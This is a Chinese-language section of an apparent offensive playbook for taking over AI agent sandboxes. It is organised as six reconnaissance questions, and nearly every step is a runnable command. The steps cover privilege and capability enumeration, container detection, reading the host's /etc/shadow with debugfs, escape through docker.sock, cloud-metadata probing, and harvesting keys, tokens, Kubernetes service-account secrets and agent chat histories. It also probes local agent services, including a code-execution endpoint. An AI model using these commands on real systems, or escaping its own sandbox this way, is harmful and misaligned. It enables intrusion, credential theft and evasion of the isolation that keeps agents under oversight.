# 四、六问测绘（人工接管时的固定动作）

> 来源：CkSKILLS v1 `agent-sandbox-takeover` §四、六问测绘（人工接管时的固定动作）（迁移至 v2 知识块）

```
Q1 我是谁     → 权限
Q2 我在哪     → 容器 / 微VM / 云主机
Q3 脚下是什么 → 挂载与块设备
Q4 我能去哪   → 可达矩阵
Q5 周围服务   → 哪些没锁
Q6 钥匙在哪   → 凭据
```

### Q1 我是谁
```bash
id; whoami; hostname; uname -a; cat /etc/os-release
cat /proc/self/status | grep -i cap
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}') 2>/dev/null
sudo -n -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```
**提权面按 CapBnd（边界集）查，不按 CapEff（有效集）。** `CapEff=0` 仍可能 `NOPASSWD:ALL`，或 CapBnd 留 SETUID/SETPCAP。

### Q2 我在哪
```bash
cat /proc/1/cgroup
cat /proc/1/comm
cat /proc/1/cmdline | tr '\0' ' '
ls -la /.dockerenv 2>/dev/null
```
| 看到 | 结论 |
|---|---|
| `/kubepods/` `/k8s.io/` | K8s Pod → 有集群横移 |
| `/docker/` 或 `/.dockerenv` | Docker 容器 |
| **无 K8s + `PID1=systemd`** | **真 VM / 云电脑 → 无容器逃逸** |
| `s6-svscan` / `tini` / `supervisord` | 容器 init |
| `entrypoint.sh` / `start.sh` | **去读它**（平台说明书） |

### Q3 脚下是什么
```bash
mount; cat /proc/mounts; df -h; lsblk
ls -la /dev/vd* /dev/sd* /dev/loop* 2>/dev/null
find / -name 'docker.sock' -o -name 'containerd.sock' 2>/dev/null
ls -la /host /hostfs /.oldroot /.rootfs 2>/dev/null
```
```
overlay on /                     ← 正常
/dev/vda5 on /mnt type ext4 (rw) ← 宿主块设备
/dev/loop61 on /.rootfs (rw)     ← 宿主 rootfs
```
缺 `SYS_ADMIN` 只否掉 `mount`。块设备可读写时 **`debugfs` 是离线读，不走 mount**：
```bash
debugfs -R "ls -l /" /dev/vda5
debugfs -R "cat /etc/shadow" /dev/vda5
```
命中 `docker.sock` = 让宿主起一个挂 `/` 的容器。

### Q4 我能去哪
```bash
ip a; ip route; cat /etc/resolv.conf; cat /etc/hosts
ss -tunap
```
`ss` 里的 ESTABLISHED 就是平台自己连的控制面 / 网关 / 库 / K8s API。

| 优先 | 目标 |
|---|---|
| ★★★ | 云元数据：`169.254.169.254` / 阿里 `100.100.100.200` / 腾讯 `metadata.tencentyun.com` |
| ★★★ | 模型网关：env/config 里的 baseUrl |
| ★★★ | 内部 API `100.x` / `9.x` / `169.254.1.1`（沙箱网关对端，不是隔离边界） |
| ★★☆ | K8s `:6443`、NAS `:2049`、ClusterIP |
| ★☆☆ | 出网代理 / 公网 |

```bash
curl -s -o /dev/null -w 'code=%{http_code} time=%{time_total}\n' --max-time 5 http://目标/
```
- 耗尽 max-time → 阻断  
- **秒回 401/403 → 通了，要认证，别放弃**  
- 秒回 200 → 没锁  
- Connection refused → 路由通、端口没开  

### Q5+Q6 服务与钥匙
```bash
env | sort
cat /proc/1/environ | tr '\0' '\n' | sort
printenv | grep -iE 'key|token|secret|pass|auth|api|proxy|cred'
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
ls -la /etc/*config* /etc/*.json /etc/s6-*/env 2>/dev/null
ls -la /root/.openclaw/ ~/.openclaw/ ~/.aws ~/.kube 2>/dev/null
find / -name 'chat-history' -o -name 'sessions' -o -name 'agent-workspaces' 2>/dev/null
ss -tlnp; ps auxf
```

冒烟（200 + 真实数据/真实执行 = 没锁）：
```bash
curl -s -X POST localhost:5001/execute -d '{"code":"id"}'
curl -s localhost:8091/
curl -s localhost:8888/api/kernels
curl -s localhost:9223/json/version
curl -s localhost:49983/envs
curl -s -o /dev/null -w '%{http_code}' localhost:8200/
curl -s localhost:1384/          # 终端服务
curl -s localhost:8330/          # 运行时服务
curl -s localhost:9012/          # 工具桥 WS/HTTP
curl -s localhost:60000/         # Agent 服务
curl -s -o /dev/null -w '%{http_code}' localhost:9876/
```
`ss` 里出现 `ttyd` / `cloudflared` / 伪装 `kworker` 的 memfd 回连：**先判定是不是本次自己挂的**。自己挂的 = 通道；平台启动脚本里就有的 ttyd/sshd/envd 才按 8.1 打。
